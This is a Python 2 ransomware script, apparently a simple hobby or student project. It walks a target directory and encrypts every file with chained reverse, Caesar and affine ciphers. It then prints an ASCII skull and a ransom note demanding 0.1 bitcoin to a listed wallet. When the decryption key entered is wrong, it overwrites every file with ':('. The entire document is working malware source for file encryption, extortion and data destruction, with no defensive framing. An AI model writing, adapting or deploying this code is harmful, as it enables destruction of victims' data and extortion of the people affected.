from CaesarCipher2 import *
from ReverseCipher import *
from AffineCipher import *
import os, sys

def main():

	#edit this to target directory
	path = '//root/Desktop/test'

	#counter variable set to zero
	fileCounter = 0

	#walk directories, sub directories, files in specified path
	for root, dirs, files in os.walk(path):
		#search files
		for file in files:
				#file found, plus one to counter
				fileCounter+=1
				#pass located file path and name
				results = (os.path.join(root, file))
				#open file found in read bytes format
				openResults = open(results, 'rb')
				#read file contents as the msg for the cipher			
				msg = openResults.read()
				#close file
				openResults.close()
				#open file in write bytes format
				openResults = open(results, 'wb')
				#set key
				key = 96
				#set mode
				mode = 'en'
				#use reverse cipher on file bytes
				c1 = reverse(msg)
				#use ceasar cipher on output of reverse cipher 
				c2 = caesarTranslate(c1, key, mode)
				#use affine DECRYPTION function on output of caesar cipher 
				c = decryptMessage(c2, key)
				#write product cipher text to file
				openResults.write(c)
				#close file
				openResults.close()
				print 'File encrypted'
				#print each file that has been encrypted
				print (results)

		#if no files found
		if fileCounter == 0:
			print 'No files found'
			#exit script
			sys.exit(0)

	#print ransom message
	print'''
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~\n"'''
	print'YOUR FILES HAVE BEEN ENCRYPTED, TO VIEW THEM AGAIN'
	print'SEND 0.1 BITCOIN TO THE WALLET ID : 3LYmZHemdG1phv3djSDQfH4GnvsN7JeV9n'
	print'ATTACH YOUR EMAIL IN THE TRANSACTION TO RECIEVE YOUR KEY'
	print'DO NOT CLOSE THIS WINDOW OR SHUTDOWN YOUR MACHINE\n'
		
	#ask user for the decrption key	
	deKey = raw_input('Input key for decryption\nNOTE entering the wrong key will result in permanently lost files: ')
	sys.stdout.write ('\n')
	#convert string input to integer
	masterKey = int(deKey)

	#if user decryption key input equals the same key used to encrypt
	if masterKey == key:
		#change mode
		mode = 'de'
		#walk directories, sub directories, files in specified path
		for root, dirs, files in os.walk(path):
			#search files
			for file in files:
				#pass located file path and name
				results = (os.path.join(root, file))
				#open file found in read bytes format
				openResults = open(results, 'rb')
				#reads encrypted file contents and pass to object			
				c = openResults.read()
				#close file
				openResults.close()
				#open file in write bytes format
				openResults = open(results, 'wb')
				#use affine ENCRYPTION function on product encryption output 
				d1 = encryptMessage(c, key)
				#use ceasar cipher on output of affine 
				d2 = caesarTranslate(d1, key, mode)
				#use reverse cipher on output of ceasar cipher
				msg = reverse(d2)
				#write product cipher plain text output to file
				openResults.write(msg)
				#close file
				openResults.close()
				print 'File decrypted'
				#print each file that has been decrypted
				print results

	#if entered decryption key does not equal the same key used to encrypt
	elif deKey != 96:
		#walk directories, sub directories, files in specified path
		for root, dirs, files in os.walk(path):
			#search files
			for file in files:
				#pass located file path and name
				results = (os.path.join(root, file))
				#open file in write format
				openResults = open(results, 'w')
				#overwrite file contents with displayed message
				openResults.write(':(')
				#close file
				openResults.close()
				print 'File deleted'
				#print each file that has been deleted
				print results

main()
